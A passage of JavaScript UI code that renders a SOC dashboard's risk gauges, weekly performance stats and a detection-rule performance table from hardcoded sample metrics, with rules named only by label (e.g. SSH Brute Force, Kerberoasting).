              return '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;font-size:.62rem">' +
                '<span style="min-width:100px;font-weight:600">' + esc(bu.unit) + '</span>' +
                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + bu.score + '%;background:' + riskColor + '"></div></div>' +
                '<span style="min-width:25px;text-align:right;font-weight:600;color:' + riskColor + '">' + bu.score + '</span>' +
                '<span style="min-width:40px;text-align:right;color:var(--mut)">' + bu.alerts + ' alerts</span>' +
                '<span style="min-width:15px;text-align:right;color:' + (bu.trend==='up'?'#ff1744':bu.trend==='down'?'#00e676':'var(--mut)') + '">' + (bu.trend==='up'?'^':bu.trend==='down'?'v':'-') + '</span>' +
              '</div>';
            }).join('') +
            '<div style="margin-top:8px;font-size:.55rem;color:var(--mut)">Risk score combines alert volume, critical asset exposure, vulnerability count, and compliance gaps</div>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Weekly SOC Performance Summary</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-grid4">' +
            [
              {label:'Detection Efficacy',value:'82%',color:m.mttd.current<=m.mttd.target?'#00e676':'#ff9100',detail:'Rules detecting real threats'},
              {label:'Coverage Score',value:'73%',color:'#ffd600',detail:'MITRE techniques covered'},
              {label:'Automation Rate',value:'35%',color:'#00e5ff',detail:'Alerts auto-remediated'},
              {label:'Threat Intel Usage',value:'68%',color:'#7c4dff',detail:'IOCs from feeds matched'},
              {label:'Tool Integration',value:'92%',color:'#00e676',detail:'Log sources connected'},
              {label:'Analyst Utilization',value:'78%',color:'#ff9100',detail:'Analyst time on investigations'},
              {label:'Customer Impact',value:'0',color:'#00e676',detail:'Customer-facing incidents'},
              {label:'Regulatory Events',value:'2',color:'#ff1744',detail:'Events requiring notification'},
            ].map(function(s) {
              return '<div class="ct-stat">' +
                '<div class="ct-stat-v" style="color:' + s.color + '">' + s.value + '</div>' +
                '<div class="ct-stat-l">' + esc(s.label) + '</div>' +
                '<div style="font-size:.5rem;color:var(--mut);margin-top:2px">' + esc(s.detail) + '</div>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Detection Rule Performance (Last 30 Days)</div>' +
        '<div class="ct-panel-b" style="max-height:300px;overflow-y:auto">' +
          '<table class="ct-tbl">' +
            '<thead><tr><th>Rule</th><th>Triggers</th><th>True Pos</th><th>False Pos</th><th>TP Rate</th><th>Avg Time</th><th>Trend</th></tr></thead>' +
            '<tbody>' +
              [
                {name:'SSH Brute Force',triggers:156,tp:142,fp:14,avgTime:'2.1m',trend:[8,12,15,18,22,25,20,18,15,12]},
                {name:'SQL Injection',triggers:89,tp:78,fp:11,avgTime:'1.5m',trend:[5,8,12,15,10,8,6,8,10,7]},
                {name:'Encoded PowerShell',triggers:45,tp:38,fp:7,avgTime:'3.2m',trend:[2,3,5,4,6,5,4,5,6,5]},
                {name:'New Admin Account',triggers:12,tp:10,fp:2,avgTime:'4.5m',trend:[0,1,2,1,0,1,2,1,2,2]},
                {name:'C2 Beacon Pattern',triggers:28,tp:25,fp:3,avgTime:'5.8m',trend:[1,2,3,2,4,3,2,3,4,4]},
                {name:'Mass File Access',triggers:34,tp:22,fp:12,avgTime:'2.8m',trend:[3,4,2,5,3,4,2,5,3,3]},
                {name:'DNS Tunneling',triggers:18,tp:15,fp:3,avgTime:'6.1m',trend:[1,1,2,2,3,2,1,2,2,2]},
                {name:'Kerberoasting',triggers:23,tp:20,fp:3,avgTime:'4.2m',trend:[1,2,2,3,2,3,2,2,3,3]},
                {name:'Ransomware Behavior',triggers:5,tp:5,fp:0,avgTime:'0.8m',trend:[0,0,1,0,0,1,0,0,1,2]},
                {name:'Audit Log Cleared',triggers:8,tp:7,fp:1,avgTime:'1.2m',trend:[0,1,1,0,0,1,1,1,2,1]},
                {name:'Pass-the-Hash',triggers:15,tp:12,fp:3,avgTime:'3.5m',trend:[1,1,2,1,2,1,2,1,2,2]},
                {name:'LOLBin Execution',triggers:67,tp:45,fp:22,avgTime:'2.5m',trend:[5,6,7,8,6,7,5,8,7,8]},
                {name:'Impossible Travel',triggers:42,tp:28,fp:14,avgTime:'8.2m',trend:[3,4,5,4,5,4,3,4,5,5]},
                {name:'Container Escape',triggers:3,tp:2,fp:1,avgTime:'12.0m',trend:[0,0,0,0,1,0,0,0,1,1]},
                {name:'Honeypot Interaction',triggers:19,tp:19,fp:0,avgTime:'1.0m',trend:[1,2,2,1,2,3,2,1,3,2]},
              ].map(function(r) {
                var tpRate = Math.round((r.tp / r.triggers) * 100);
                var maxTrigger = 156;
                return '<tr>' +
                  '<td style="font-weight:600;font-size:.62rem">' + esc(r.name) + '</td>' +
                  '<td>' + r.triggers + '</td>' +
                  '<td style="color:#00e676">' + r.tp + '</td>' +
                  '<td style="color:' + (r.fp > 10 ? '#ff1744' : r.fp > 5 ? '#ff9100' : '#ffd600') + '">' + r.fp + '</td>' +
                  '<td style="font-weight:600;color:' + (tpRate >= 90 ? '#00e676' : tpRate >= 75 ? '#ffd600' : '#ff9100') + '">' + tpRate + '%</td>' +
                  '<td style="color:var(--mut)">' + r.avgTime + '</td>' +
                  '<td><div class="ct-sparkline">' + r.trend.map(function(v) {
                    var h = Math.max(2, Math.round((v / 25) * 20));
                    return '<div class="ct-spark-bar" style="height:' + h + 'px"></div>';
                  }).join('') + '</div></td>' +
                '</tr>';
              }).join('') +
            '</tbody>' +
          '</table>' +
        '</div>' +
      '</div>';
  }

  render();
}

export function cleanupCitadel() {}
